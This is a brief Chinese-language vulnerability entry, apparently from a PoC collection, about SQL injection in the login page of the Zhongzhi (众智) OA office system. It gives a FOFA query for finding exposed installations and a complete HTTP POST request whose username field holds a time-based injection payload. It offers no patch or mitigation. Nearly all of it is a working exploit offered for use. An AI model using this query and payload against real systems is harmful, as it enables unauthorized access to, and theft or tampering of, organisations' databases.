# 众智OA办公系统Login存在SQL注入漏洞

众智OA办公系统Login存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```javascript
body="/Account/Login?ACT=Index"
```

## poc

```javascript
POST /Account/Login?ACT=Index&CLR=Home HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Encoding: gzip, deflate

username=1');WAITFOR+DELAY+'0:0:5'--&password=1&RememberMe=false
```

![image-20241012132503527](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121325595.png)